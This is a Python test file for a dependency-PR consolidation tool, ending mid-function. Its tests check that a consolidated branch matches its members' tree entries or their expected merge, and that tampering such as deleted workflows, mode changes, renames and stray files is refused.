"""Tests for coupled-set consolidation verification.

The union check compares tree metadata from `git diff --raw -z`, not diff
text. Tests that existed only to pin the behaviour of the old unified-diff
parser (`+++`-prefixed content, dashes-prefixed removals arming a header
skip, hunk-state resets) were removed with that parser: they asserted
properties of a state machine that no longer exists, and there is no state
machine left for crafted content to steer. What replaces them is the block
of attack regressions below, which covers what the text check structurally
could not see -- deletions, modes, renames, and file identity.
"""

import json
import os
import subprocess
import sys
from types import SimpleNamespace

import pytest

from scripts.security import dep_triage_consolidate as dcon

BLOB_PAYLOADQ_OLD = "a" * 40
BLOB_PAYLOADQ_NEW = "b" * 40
BLOB_QUALITY_OLD = "c" * 40
BLOB_QUALITY_NEW = "d" * 40
BLOB_PAYLOAD = "e" * 40
BLOB_PAYLOADQ_NEWLANK = "f" * 40
ZEROS = "0" * 40

# Object ids for the expected-merge check. Real git ids, in the sense that
# matters here: 40 lowercase hex characters, which is what the plumbing
# wrappers require before they will compare anything.
BASE_OID = "1" * 40
EXPECTED_TREE = "2" * 40
OTHER_TREE = "3" * 40
CHAIN_COMMIT = "4" * 40

CODEQL = ".github/workflows/codeql.yml"
QUALITY = ".github/workflows/code-quality.yml"


def raw(*records):
    """Build `git diff --raw -z` output from (meta..., *paths) tuples.

    Each record is ``(oldmode, newmode, oldsha, newsha, status, *paths)``.
    The real command emits a trailing NUL after the final field, so this does
    too -- a parser that only worked on input without it would be parsing
    something git never produces.
    """
    fields = []
    for record in records:
        fields.append(":%s %s %s %s %s" % tuple(record[:5]))
        fields.extend(record[5:])
    return "".join(f + "\0" for f in fields)


# PR #450 bumps codeql-action/init, in codeql.yml. Its PR diff has two hunks
# (the `uses:` line and the pinned-version comment), but `--raw` reports one
# entry per *path*: what is compared is the file's resulting blob, so hunk
# count is not part of the comparison and cannot be gamed by splitting a
# change across more of them.
MEMBER_450 = raw(
    ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", CODEQL)
)
# PR #452 bumps codeql-action/upload-sarif, which lives in a different file.
MEMBER_452 = raw(("100644", "100644", BLOB_QUALITY_OLD, BLOB_QUALITY_NEW, "M", QUALITY))
COMBINED = raw(
    ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", CODEQL),
    ("100644", "100644", BLOB_QUALITY_OLD, BLOB_QUALITY_NEW, "M", QUALITY),
)


# --------------------------------------------------------------------------
# The legitimate path
# --------------------------------------------------------------------------


def test_verify_union_accepts_an_exact_union():
    ok, missing, extra = dcon.verify_union([MEMBER_450, MEMBER_452], COMBINED)
    assert ok and not missing and not extra


def test_verify_union_accepts_a_two_hunk_single_file_consolidation():
    """A member whose PR edits one file in two places still verifies.

    Two hunks collapse into one `--raw` entry, because the entry describes
    the file's resulting content. The union check is comparing end states,
    not counting edits.
    """
    member = raw(
        ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", CODEQL)
    )
    ok, missing, extra = dcon.verify_union([member], member)
    assert ok and not missing and not extra


def test_verify_union_accepts_a_member_that_legitimately_adds_a_file():
    member = raw(("000000", "100644", ZEROS, BLOB_PAYLOADQ_NEW, "A", "new.yml"))
    ok, _, _ = dcon.verify_union([member], member)
    assert ok


def test_verify_union_reports_a_member_change_the_branch_does_not_carry():
    ok, missing, extra = dcon.verify_union([MEMBER_450, MEMBER_452], MEMBER_450)
    assert not ok
    assert dcon.TreeEntry(QUALITY, "M", "100644", BLOB_QUALITY_NEW) in missing
    assert not extra


# --------------------------------------------------------------------------
# Attack regressions
#
# Each of these six passed the previous added-line text check. The first
# three are invisible to any `+`-line comparison; the fourth defeated it by
# discarding the file a line landed in; the last two by discarding lines
# that were empty after stripping.
# --------------------------------------------------------------------------


def test_attack_deleting_a_security_workflow_is_reported():
    """A deletion is not an added line, so the text check never saw it."""
    combined = COMBINED + raw(
        (
            "100644",
            "000000",
            BLOB_PAYLOAD,
            ZEROS,
            "D",
            ".github/workflows/security-scan.yml",
        )
    )
    ok, _, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
    assert not ok
    assert (
        dcon.TreeEntry(".github/workflows/security-scan.yml", "D", "000000", ZEROS)
        in extra
    )


def test_attack_making_a_script_executable_is_reported():
    """A mode change alters no line at all; only the mode bits move."""
    combined = COMBINED + raw(
        ("100644", "100755", BLOB_PAYLOAD, BLOB_PAYLOAD, "M", "scripts/deploy.sh")
    )
    ok, _, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
    assert not ok
    assert dcon.TreeEntry("scripts/deploy.sh", "M", "100755", BLOB_PAYLOAD) in extra


def test_attack_chmod_on_a_members_own_file_is_reported():
    """Sharper than the above: the path *is* one a member changed.

    It cannot be caught by noticing an unfamiliar path, and the blob is the
    member's own. Only the mode differs, so this fails unless mode is part
    of the compared entry.
    """
    combined = raw(
        ("100644", "100755", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", CODEQL),
        ("100644", "100644", BLOB_QUALITY_OLD, BLOB_QUALITY_NEW, "M", QUALITY),
    )
    ok, missing, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
    assert not ok
    assert dcon.TreeEntry(CODEQL, "M", "100755", BLOB_PAYLOADQ_NEW) in extra
    assert dcon.TreeEntry(CODEQL, "M", "100644", BLOB_PAYLOADQ_NEW) in missing


def test_attack_renaming_a_workflow_out_of_the_workflows_directory_is_reported():
    """Under `--no-renames` a move is a deletion plus a creation.

    Both halves are unexplained: the workflow stops being a workflow, and a
    file appears where no member put one.
    """
    combined = raw(
        ("100644", "000000", BLOB_PAYLOADQ_OLD, ZEROS, "D", CODEQL),
        ("000000", "100644", ZEROS, BLOB_PAYLOADQ_OLD, "A", "docs/codeql.yml"),
        ("100644", "100644", BLOB_QUALITY_OLD, BLOB_QUALITY_NEW, "M", QUALITY),
    )
    ok, missing, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
    assert not ok
    assert dcon.TreeEntry("docs/codeql.yml", "A", "100644", BLOB_PAYLOADQ_OLD) in extra
    assert dcon.TreeEntry(CODEQL, "D", "000000", ZEROS) in extra


def test_attack_rename_reported_even_when_git_detects_it_as_a_rename():
    """The same move, reported by git in its `R` form rather than as D+A.

    `consolidate_family` passes `--no-renames`, but `verify_union` is given
    whatever the injected runner returns, so the `R` form must be caught
    too -- including the disappearance of the source path.
    """
    combined = raw(
        (
            "100644",
            "100644",
            BLOB_PAYLOADQ_OLD,
            BLOB_PAYLOADQ_OLD,
            "R100",
            CODEQL,
            "docs/codeql.yml",
        ),
        ("100644", "100644", BLOB_QUALITY_OLD, BLOB_QUALITY_NEW, "M", QUALITY),
    )
    ok, missing, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
    assert not ok
    assert dcon.TreeEntry(CODEQL, "D", "000000", ZEROS) in extra
    assert dcon.TreeEntry("docs/codeql.yml", "R", "100644", BLOB_PAYLOADQ_OLD) in extra


def test_attack_approved_content_landing_in_a_different_file_is_reported():
    """The blob is byte-identical to an approved one -- in the wrong file.

    This is the case that most directly killed the text check: comparing
    added lines as bare strings threw away the path, so an approved line
    satisfied the check no matter which file it was written into.
    """
    combined = COMBINED + raw(
        (
            "000000",
            "100644",
            ZEROS,
            BLOB_PAYLOADQ_NEW,
            "A",
            ".github/workflows/evil.yml",
        )
    )
    ok, _, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
    assert not ok
    assert (
        dcon.TreeEntry(".github/workflows/evil.yml", "A", "100644", BLOB_PAYLOADQ_NEW)
        in extra
    )


def test_attack_a_new_file_whose_only_added_line_is_blank_is_reported():
    """The old check dropped lines that were empty after stripping.

    A file is a tree entry whether or not its contents amount to anything,
    and an empty file in `.github/workflows/` is still a file an attacker
    can grow in a later commit.
    """
    combined = COMBINED + raw(
        (
            "000000",
            "100644",
            ZEROS,
            BLOB_PAYLOADQ_NEWLANK,
            "A",
            ".github/workflows/placeholder.yml",
        )
    )
    ok, _, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
    assert not ok
    assert (
        dcon.TreeEntry(
            ".github/workflows/placeholder.yml", "A", "100644", BLOB_PAYLOADQ_NEWLANK
        )
        in extra
    )


def test_attack_a_whitespace_only_addition_to_a_members_file_is_reported():
    """Whitespace-only additions were stripped to nothing and discarded.

    Applied to a file a member legitimately changed, so novelty of the path
    cannot catch it: the entry differs only in the blob, which is exactly
    what a content hash is for.
    """
    blob_with_trailing_whitespace = "9" * 40
    combined = raw(
        (
            "100644",
            "100644",
            BLOB_PAYLOADQ_OLD,
            blob_with_trailing_whitespace,
            "M",
            CODEQL,
        ),
        ("100644", "100644", BLOB_QUALITY_OLD, BLOB_QUALITY_NEW, "M", QUALITY),
    )
    ok, missing, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
    assert not ok
    assert dcon.TreeEntry(CODEQL, "M", "100644", blob_with_trailing_whitespace) in extra
    assert dcon.TreeEntry(CODEQL, "M", "100644", BLOB_PAYLOADQ_NEW) in missing


def test_attack_a_file_swapped_for_a_symlink_is_reported():
    """A type change (`T`) shows up as a mode of 120000."""
    combined = COMBINED + raw(
        (
            "100644",
            "120000",
            BLOB_PAYLOAD,
            BLOB_PAYLOADQ_NEWLANK,
            "T",
            "config/settings.yml",
        )
    )
    ok, _, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
    assert not ok
    assert (
        dcon.TreeEntry("config/settings.yml", "T", "120000", BLOB_PAYLOADQ_NEWLANK)
        in extra
    )


def test_verify_union_reports_content_added_when_no_member_contributed():
    ok, _, extra = dcon.verify_union([], COMBINED)
    assert not ok
    assert len(extra) == 2


# --------------------------------------------------------------------------
# Contested paths
# --------------------------------------------------------------------------


def test_verify_union_reports_a_path_two_members_touched():
    """Two members editing one file cannot be reconciled from hashes.

    The branch's blob for that path is git's merge of both members' blobs
    and equals neither. Reporting it is the only honest outcome; silently
    accepting whatever the merge produced would be a hole in exactly the
    file every member of the family cares about.
    """
    member_a = raw(
        ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", CODEQL)
    )
    member_b = raw(("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOAD, "M", CODEQL))
    merged = raw(
        ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEWLANK, "M", CODEQL)
    )
    ok, missing, extra = dcon.verify_union([member_a, member_b], merged)
    assert not ok
    assert dcon.ContestedPath(CODEQL, 2) in extra


def test_contested_path_is_reported_once_not_as_a_pile_of_mismatches():
    """One clear signal, so it does not read as an attack."""
    member_a = raw(
        ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", CODEQL)
    )
    member_b = raw(("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOAD, "M", CODEQL))
    merged = raw(
        ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEWLANK, "M", CODEQL)
    )
    _, missing, extra = dcon.verify_union([member_a, member_b], merged)
    assert extra == {dcon.ContestedPath(CODEQL, 2)}
    assert not missing


def test_contested_path_repr_names_the_file_and_how_many_members_changed_it():
    """The repr is rendered into the message an operator reads.

    It no longer says "review by hand": a contested path is settled against
    the expected merge, and this marker only appears in a failure message
    when that check could not settle it either -- at which point what the
    operator needs is the file name and the number of members involved.
    """
    text = repr(dcon.ContestedPath(CODEQL, 3))
    assert CODEQL in text
    assert "3 member" in text
    assert "expected merge" in text


def test_contested_path_does_not_mask_an_unrelated_extra_entry():
    """A contested path must not become a blanket amnesty for the branch."""
    member_a = raw(
        ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", CODEQL)
    )
    member_b = raw(("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOAD, "M", CODEQL))
    merged = raw(
        ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEWLANK, "M", CODEQL),
        ("000000", "100644", ZEROS, BLOB_PAYLOAD, "A", "evil.sh"),
    )
    ok, _, extra = dcon.verify_union([member_a, member_b], merged)
    assert not ok
    assert dcon.TreeEntry("evil.sh", "A", "100644", BLOB_PAYLOAD) in extra
    assert dcon.ContestedPath(CODEQL, 2) in extra


# --------------------------------------------------------------------------
# Naming, grouping, PR body
# --------------------------------------------------------------------------


def test_branch_name_is_slugified():
    assert dcon.branch_name("github/codeql-action", "4.38.0") == (
        "dep-consolidate/github-codeql-action-4.38.0"
    )


def test_branch_name_slugifies_an_npm_requirement_range_version():
    """`to_version` legitimately carries `^`/`~` for npm requirement bumps
    (e.g. "Update vitest requirement from ^4.0.16 to ^5.0.0"). Those
    characters are invalid in a git ref, so the version must be slugified
    too, not just the family -- otherwise consolidation is dead for exactly
    the coupled-npm case it exists to handle."""
    branch = dcon.branch_name("npm:/frontend:vitest", "^5.0.0")
    # Asserted structurally rather than by shelling out to
    # `git check-ref-format`: none of git's forbidden ref characters may
    # appear, and the slug may not start or end with a dash.
    forbidden = set("^~:?*[\\")
    assert not (forbidden & set(branch))
    slug = branch.split("/", 1)[1]
    assert not slug.startswith("-")
    assert not slug.endswith("-")


def git_accepts_ref(name):
    """Ask git itself whether a branch name is legal.

    The rules for a ref are not obvious enough to restate in a test -- that
    is how the trailing-dot case got shipped in the first place -- so the
    oracle here is `git check-ref-format --branch`, the same code that
    rejects the name at `git switch -c`. It reads no repository, so this
    stays hermetic.
    """
    return (
        subprocess.run(
            ["git", "check-ref-format", "--branch", name],
            capture_output=True,
        ).returncode
        == 0
    )


def test_git_accepts_ref_rejects_a_name_git_really_rejects():
    """Positive control for the oracle above.

    A helper that answered "fine" to everything would make every test below
    pass while checking nothing, so pin both of its answers.
    """
    assert git_accepts_ref("dep-consolidate/github-codeql-action-4.38.0")
    assert not git_accepts_ref("dep-consolidate/x-..")


@pytest.mark.parametrize(
    "version",
    [
        "4.38.0",
        "..",
        ".",
        "...",
        "1.0.",
        ".1.0",
        "1..0",
        "lock",
        "4.lock",
        "1.0.0.lock",
        "^5.0.0",
        "~1.2.3",
        "",
        "@{upstream}",
        "a b",
        "-",
    ],
)
def test_branch_name_never_returns_a_ref_git_would_reject(version):
    """Every version either names a legal branch or is refused up front.

    Failing at `git switch -c` is a worse diagnostic than refusing here:
    git's message talks about a ref several calls away from the family and
    version that produced it, and by then the function is inside the
    try/finally that has to unwind a checkout.
    """
    try:
        name = dcon.branch_name("github/codeql-action", version)
    except dcon.InvalidBranchName:
        return
    assert git_accepts_ref(name), name


@pytest.mark.parametrize(
    "family,version",
    [("github/codeql-action", ".."), ("github/codeql-action", "1.0.")],
)
def test_branch_name_sanitises_the_dot_cases_rather_than_failing(family, version):
    """The two cases from the report are sanitised, not merely refused.

    `..` and a trailing `.` are the shapes a real version string produces,
    so losing the family to an exception would be a regression in behaviour
    for input that has a perfectly good branch name available.
    """
    name = dcon.branch_name(family, version)
    assert name.startswith("dep-consolidate/github-codeql-action")
    assert git_accepts_ref(name)


def test_branch_name_refuses_when_nothing_is_left_to_name():
    """A family and version that slugify away entirely name nothing.

    `dep-consolidate/-` is a legal ref, so git would accept it; it is still
    a caller bug, and one branch per empty family would collide.
    """
    with pytest.raises(dcon.InvalidBranchName):
        dcon.branch_name("", "")


def test_consolidate_family_refuses_an_unnameable_family_without_touching_git():
    run = _happy_run()
    ok, message = dcon.consolidate_family("", "", [450, 452], run)
    assert not ok
    assert "cannot name a branch" in message
    assert not run.calls, "nothing may run before the branch name is known"


def test_families_from_decisions_groups_coupled_members():
    decisions = [
        {"number": 452, "code": "coupled", "family": "github/codeql-action"},
        {"number": 450, "code": "coupled", "family": "github/codeql-action"},
        {"number": 442, "code": "coupled", "family": "npm:/frontend:vitest"},
        {"number": 439, "code": "candidate", "family": None},
    ]
    families = dcon.families_from_decisions(decisions)
    assert families["github/codeql-action"] == [450, 452]
    assert families["npm:/frontend:vitest"] == [442]
    assert 439 not in [n for v in families.values() for n in v]


def test_families_from_decisions_ignores_non_coupled():
    assert (
        dcon.families_from_decisions(
            [{"number": 1, "code": "merge-safe", "family": None}]
        )
        == {}
    )


def test_consolidation_body_names_every_member_and_the_coupling():
    body = dcon.consolidation_body(
        "github/codeql-action", "4.38.0", [450, 452, 453, 454]
    )
    for number in (450, 452, 453, 454):
        assert f"#{number}" in body
    assert "together" in body.lower()
    assert "4.38.0" in body


def test_consolidation_body_does_not_claim_members_were_closed():
    body = dcon.consolidation_body("github/codeql-action", "4.38.0", [450, 452])
    assert "closed" not in body.lower()
    assert "left open" in body.lower()


def test_consolidation_body_describes_what_was_actually_verified():
    """The body must not claim more than the check establishes.

    It previously told reviewers the branch's *added lines* had been
    verified equal to the members' added lines, which overstated a check
    that could not see deletions, modes or paths at all.
    """
    body = dcon.consolidation_body("github/codeql-action", "4.38.0", [450, 452])
    assert "added lines" not in body.lower()
    assert "mode" in body.lower()


# --------------------------------------------------------------------------
# consolidate_family orchestration
# --------------------------------------------------------------------------


class FakeRun:
    """Records commands; returns canned stdout per matched substring.

    Two commands are answered by default because every consolidation runs
    them and no test is about them: `git --version` (the `merge-tree`
    version floor) and `git rev-parse HEAD` (the branch's base commit).
    Either can still be overridden by passing the same needle.

    Needles are matched longest-first, so a specific one
    (`rev-parse HEAD^{tree}`) wins over a general one (`rev-parse HEAD`)
    regardless of the order they were registered in.
    """

    DEFAULTS = {
        "git --version": "git version 2.50.1 (Apple Git-155)\n",
        "rev-parse HEAD": BASE_OID + "\n",
    }

    def __init__(self, responses=None, fail_on=None):
        self.calls = []
        self.responses = dict(self.DEFAULTS)
        self.responses.update(responses or {})
        self.fail_on = fail_on or ()

    def __call__(self, args, capture=False):
        self.calls.append(list(args))
        joined = " ".join(args)
        for needle in self.fail_on:
            if needle in joined:
                raise dcon.CommandFailed(joined)
        for needle in sorted(self.responses, key=len, reverse=True):
            if needle in joined:
                return self.responses[needle]
        return ""

    def ran(self, needle):
        return any(needle in " ".join(c) for c in self.calls)


def _happy_run(**overrides):
    responses = {
        "origin/main...pr-450": MEMBER_450,
        "origin/main...pr-452": MEMBER_452,
        "origin/main...HEAD": COMBINED,
    }
    responses.update(overrides.pop("responses", {}))
    return FakeRun(responses=responses, **overrides)


def test_consolidate_family_opens_pr_when_union_matches():
    run = _happy_run()
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert ok, message
    assert run.ran("switch -c dep-consolidate/github-codeql-action-4.38.0")
    assert run.ran("pr create")
    # A plain --force on a stable branch name would let this call clobber
    # commits an operator added to an already-open consolidation PR.
    assert run.ran(
        "push -u origin dep-consolidate/github-codeql-action-4.38.0 "
        "--force-with-lease"
    )


def test_consolidate_family_asks_git_for_tree_metadata_not_diff_text():
    """The flags are the control. `--raw -z` is what makes the comparison
    structural; `--no-abbrev` prevents git shortening hashes by a length
    that varies with repository size; `--no-renames` makes a move a
    deterministic D+A on both sides instead of a similarity heuristic whose
    result depends on the size of the surrounding diff."""
    run = _happy_run()
    dcon.consolidate_family("github/codeql-action", "4.38.0", [450, 452], run)
    diffs = [c for c in run.calls if c[:2] == ["git", "diff"]]
    assert diffs, "no git diff was run"
    for call in diffs:
        assert "--raw" in call
        assert "-z" in call
        assert "--no-abbrev" in call
        assert "--no-renames" in call


def test_consolidate_family_refuses_when_the_branch_carries_an_extra_entry():
    """A change no member introduced is an unreviewed change."""
    sneaky = COMBINED + raw(("000000", "100644", ZEROS, BLOB_PAYLOAD, "A", "evil.sh"))
    run = _happy_run(responses={"origin/main...HEAD": sneaky})
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "union" in message.lower()
    assert "evil.sh" in message
    assert not run.ran("pr create")
    # Defense in depth: a regression that moved the push above the union
    # check would still be caught here even if `pr create` were guarded.
    assert not run.ran("push")


def test_consolidate_family_refuses_when_the_branch_deletes_a_workflow():
    """The deletion case, driven through the orchestration rather than
    through `verify_union` alone -- the gate must be wired to the push."""
    sneaky = COMBINED + raw(
        (
            "100644",
            "000000",
            BLOB_PAYLOAD,
            ZEROS,
            "D",
            ".github/workflows/security-scan.yml",
        )
    )
    run = _happy_run(responses={"origin/main...HEAD": sneaky})
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "security-scan.yml" in message
    assert not run.ran("pr create")
    assert not run.ran("push")


# --------------------------------------------------------------------------
# The contested case: two members changing one file
#
# The blob for such a path is git's three-way merge of several members'
# versions and equals no single member's, so no comparison of hashes can
# settle it. It is settled instead by recomputing the tree the merge should
# produce, with `git merge-tree --write-tree`, and requiring the branch to be
# exactly that tree. This is the shape of the flagship codeql family -- every
# member edits one workflow file -- so refusing it outright refused the case
# the module exists for.
# --------------------------------------------------------------------------


def _contested_run(**overrides):
    """A run where both members change CODEQL, so the path is contested."""
    responses = {
        "origin/main...pr-450": raw(
            ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", CODEQL)
        ),
        "origin/main...pr-452": raw(
            ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOAD, "M", CODEQL)
        ),
        "origin/main...HEAD": raw(
            ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEWLANK, "M", CODEQL)
        ),
        "merge-tree --write-tree": EXPECTED_TREE + "\n",
        "commit-tree": CHAIN_COMMIT + "\n",
        f"rev-parse {CHAIN_COMMIT}^": EXPECTED_TREE + "\n",
        "rev-parse HEAD^{tree}": EXPECTED_TREE + "\n",
    }
    responses.update(overrides.pop("responses", {}))
    return FakeRun(responses=responses, **overrides)


def test_consolidate_family_verifies_a_contested_path_against_the_expected_merge():
    """The flagship case: several members editing one workflow file.

    Blob comparison cannot decide this path, so the branch is checked against
    the tree `git merge-tree` says merging these members from this base
    produces. Equal means the branch *is* that merge, which is a stronger
    statement than the per-path check makes, so the PR is opened.
    """
    run = _contested_run()
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert ok, message
    assert run.ran("merge-tree --write-tree")
    assert run.ran("pr create")


def test_consolidate_family_refuses_a_contested_branch_that_is_not_the_merge():
    """One extra line in a contested file is still caught.

    This is the hole the expected-merge check must not open: the path is
    contested, so the blob comparison abstains, and the only thing standing
    between a smuggled edit and an opened PR is the tree comparison.
    """
    run = _contested_run(
        responses={
            "rev-parse HEAD^{tree}": OTHER_TREE + "\n",
            f"{EXPECTED_TREE} {OTHER_TREE}": raw(
                ("100644", "100644", BLOB_PAYLOAD, BLOB_PAYLOADQ_NEW, "M", CODEQL)
            ),
        }
    )
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "not the members' expected merge" in message
    assert CODEQL in message
    assert not run.ran("pr create")
    assert not run.ran("push")


def test_consolidate_family_refuses_when_the_expected_merge_conflicts():
    """A conflicted expected merge is a failure, not a skip.

    `merge-tree` exits non-zero when the merge conflicts. The members then do
    not compose cleanly, so there is no tree to compare the branch against --
    and "we could not work out what this should look like" must never be
    reported as "it looks right".
    """
    run = _contested_run(fail_on=("merge-tree",))
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "does not compose cleanly" in message
    assert not run.ran("pr create")
    assert not run.ran("push")


def test_consolidate_family_refuses_when_merge_tree_output_is_not_an_object_id():
    run = _contested_run(responses={"merge-tree --write-tree": "who knows\n"})
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "object id" in message
    assert not run.ran("pr create")
    assert not run.ran("push")


def test_consolidate_family_refuses_a_contested_path_on_a_git_without_write_tree():
    """`--write-tree` arrived in git 2.38. An older git must say so.

    Without the floor the call fails with git's usage error, which reads as
    a broken command rather than as an environment that cannot run this
    check at all.
    """
    run = _contested_run(responses={"git --version": "git version 2.34.1\n"})
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "2.38" in message
    assert "merge-tree" in message
    assert not run.ran("merge-tree")
    assert not run.ran("pr create")
    assert not run.ran("push")


def test_consolidate_family_still_refuses_a_smuggled_file_beside_a_contested_path():
    """A contested path does not buy an unexplained one a pass.

    The expected-merge check is only reached when *every* mismatch is a
    contested path. A branch that also carries a file no member touched is
    refused by the blob comparison first, so the wider check can never be
    used to launder it.
    """
    run = _contested_run(
        responses={
            "origin/main...HEAD": raw(
                (
                    "100644",
                    "100644",
                    BLOB_PAYLOADQ_OLD,
                    BLOB_PAYLOADQ_NEWLANK,
                    "M",
                    CODEQL,
                ),
                ("000000", "100644", ZEROS, BLOB_PAYLOAD, "A", "evil.sh"),
            )
        }
    )
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "union mismatch" in message
    assert "evil.sh" in message
    assert not run.ran("merge-tree")
    assert not run.ran("pr create")
    assert not run.ran("push")


def test_consolidate_family_still_refuses_a_missing_member_change_beside_contested():
    run = _contested_run(
        responses={
            "origin/main...pr-452": raw(
                ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOAD, "M", CODEQL),
                ("100644", "100644", BLOB_QUALITY_OLD, BLOB_QUALITY_NEW, "M", QUALITY),
            )
        }
    )
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "union mismatch" in message
    assert QUALITY in message
    assert not run.ran("merge-tree")
    assert not run.ran("push")


def test_consolidate_family_merges_members_in_the_order_it_verifies_them():
    """The expected merge must be computed in the order git merged them.

    Merging is not commutative: a different order can produce a different
    tree, so a chain built in another order would fail an honest branch and
    -- worse -- could pass a dishonest one.
    """
    run = _contested_run()
    dcon.consolidate_family("github/codeql-action", "4.38.0", [450, 452], run)
    merged = [c[-1] for c in run.calls if c[:3] == ["git", "merge", "--no-edit"]]
    expected = [
        c[-1] for c in run.calls if c[:3] == ["git", "merge-tree", "--write-tree"]
    ]
    assert merged == ["pr-450", "pr-452"]
    assert expected == ["pr-450", "pr-452"]


def test_consolidate_family_chains_the_expected_merge_through_commit_objects():
    """Each intermediate tree is wrapped in a commit, with both parents.

    `merge-tree` takes two commits, so a third member has to be merged into
    something. The wrapper records both parents exactly as `git merge` does,
    because the next merge's base is derived from the graph -- with only the
    left parent, a member built on another member's head would resolve
    against the wrong base.
    """
    run = _contested_run()
    dcon.consolidate_family("github/codeql-action", "4.38.0", [450, 452], run)
    chained = [c for c in run.calls if c[:2] == ["git", "commit-tree"]]
    assert len(chained) == 2
    for call in chained:
        assert call.count("-p") == 2
    assert chained[0][3:6] == ["-p", BASE_OID, "-p"]
    assert chained[0][6] == "pr-450"


def test_consolidate_family_creates_no_ref_for_the_expected_merge():
    """The chain leaves nothing behind an operator can trip over.

    The intermediate commits are reachable from nothing, so git's own
    garbage collection reclaims them. A ref, a tag or a branch would make
    them permanent and make this check a repository mutation.
    """
    run = _contested_run()
    dcon.consolidate_family("github/codeql-action", "4.38.0", [450, 452], run)
    # Matched with the `git` prefix: the PR body itself contains the word
    # "branch", and a bare needle would match the text rather than a command.
    for forbidden in ("git update-ref", "git branch", "git tag", "git symbolic-ref"):
        assert not run.ran(forbidden), forbidden


def test_consolidate_family_bases_the_expected_merge_on_the_branch_base():
    """Not on `origin/main` re-resolved later, and not on the branch head.

    The left side of the first `merge-tree` is the commit the consolidation
    branch was created at, read once, so the expected merge is computed from
    the same base the branch was actually built on.
    """
    run = _contested_run()
    dcon.consolidate_family("github/codeql-action", "4.38.0", [450, 452], run)
    first = next(c for c in run.calls if c[:3] == ["git", "merge-tree", "--write-tree"])
    assert first[3] == BASE_OID


def test_expected_merge_tree_does_not_pin_the_merge_base():
    """Each step derives its own base, as `git merge` does.

    `--merge-base base` would assert that the base is an ancestor of every
    member head. A Dependabot branch that has been rebased, or built on
    another member, is not required to satisfy that, and asserting it would
    make the expected tree diverge from the merge git actually performed.
    """
    run = FakeRun(
        responses={
            "merge-tree --write-tree": EXPECTED_TREE + "\n",
            "commit-tree": CHAIN_COMMIT + "\n",
            f"rev-parse {CHAIN_COMMIT}^": EXPECTED_TREE + "\n",
        }
    )
    assert (
        dcon.expected_merge_tree(BASE_OID, ["pr-450", "pr-452", "pr-453"], run)
        == EXPECTED_TREE
    )
    for call in run.calls:
        assert "--merge-base" not in call


def test_expected_merge_tree_rejects_a_git_too_old_for_write_tree():
    run = FakeRun(responses={"git --version": "git version 2.37.9\n"})
    with pytest.raises(dcon.UnverifiableMerge) as caught:
        dcon.expected_merge_tree(BASE_OID, ["pr-450"], run)
    assert "2.38" in str(caught.value)
    assert not run.ran("merge-tree")


def test_expected_merge_tree_rejects_an_unreadable_git_version():
    run = FakeRun(responses={"git --version": "some other program\n"})
    with pytest.raises(dcon.UnverifiableMerge):
        dcon.expected_merge_tree(BASE_OID, ["pr-450"], run)
    assert not run.ran("merge-tree")


def test_expected_merge_tree_reads_only_the_first_line_of_merge_tree_output():
    """A conflicted `merge-tree` prints the tree and then more sections.

    Those exits are non-zero and handled as conflicts, but the tree id is
    still the first line, and taking anything wider would compare a string
    that is not an object id.
    """
    run = FakeRun(
        responses={
            "merge-tree --write-tree": f"{EXPECTED_TREE}\nmore output here\n",
            "commit-tree": CHAIN_COMMIT + "\n",
            f"rev-parse {CHAIN_COMMIT}^": EXPECTED_TREE + "\n",
        }
    )
    assert dcon.expected_merge_tree(BASE_OID, ["pr-450"], run) == EXPECTED_TREE


def test_verify_expected_merge_names_the_paths_that_differ():
    """ "The tree is wrong" is not something an operator can act on."""
    run = FakeRun(
        responses={
